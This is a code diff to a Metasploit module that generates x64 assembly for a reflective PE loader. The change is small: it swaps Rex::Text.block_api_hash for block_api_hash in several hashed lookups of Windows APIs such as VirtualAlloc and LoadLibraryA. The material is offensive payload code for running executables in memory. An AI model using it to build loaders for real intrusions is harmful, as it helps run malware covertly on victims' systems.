@@ -4,7 +4,6 @@ module Msf
   module Payload::Windows::ReflectivePELoader_x64
     include Payload::Windows::BlockApi_x64
     def asm_reflective_pe_loader_x64(opts)
-
       prologue = ''
       if opts[:is_dll] == true
         prologue = %(
@@ -30,7 +29,7 @@ stub:
   mov rdx,[rsp]                   ; dwSize
   xor rcx,rcx                     ; lpAddress
   xchg rsp,rbp                    ; Swap shadow stack
-  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
+  mov r10d,#{block_api_hash('kernel32.dll', 'VirtualAlloc')}
   call api_call                   ; VirtualAlloc(lpAddress,dwSize,MEM_COMMIT|MEM_TOP_DOWN|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
   xchg rsp,rbp                    ; Swap shadow stack
   mov rdi,rax                     ; Save the new base address to rdi
@@ -123,7 +122,7 @@ all_resolved:
 LoadLibraryA:
   ;mov rcx,rax                     ; Move the address of library name string to RCX
   xchg rbp,rsp                     ; Swap shadow stack
-  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
+  mov r10d,#{block_api_hash('kernel32.dll', 'LoadLibraryA')}
   call api_call                   ; LoadLibraryA(RCX)
   xchg rbp,rsp                    ; Swap shadow stack
   ret                             ; <-
@@ -131,7 +130,7 @@ GetProcAddress:
   xchg rbp,rsp                    ; Swap shadow stack
   mov rcx,r13                     ; Move the module handle to RCX as first parameter
   mov rdx,rax                     ; Move the address of function name string to RDX as second parameter
-  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
+  mov r10d,#{block_api_hash('kernel32.dll', 'GetProcAddress')}
   call api_call                   ; GetProcAddress(ebx,[esp+4])
   xchg rbp,rsp                    ; Swap shadow stack
   ret                             ; <-
@@ -154,7 +153,7 @@ PE_start:
   xor rdx,rdx                     ; lpBaseAddress
   xor r8,r8                       ; hProcess
   xchg rbp,rsp                    ; Swap shadow stack
-  mov r10d,#{Rex::Text.block_api_hash('kernel32.dll', 'FlushInstructionCache')}
+  mov r10d,#{block_api_hash('kernel32.dll', 'FlushInstructionCache')}
   call api_call                   ; FlushInstructionCache(0xffffffff,NULL,NULL);
   #{prologue}
   add r13,r12                     ; Add the address of entry value to image base
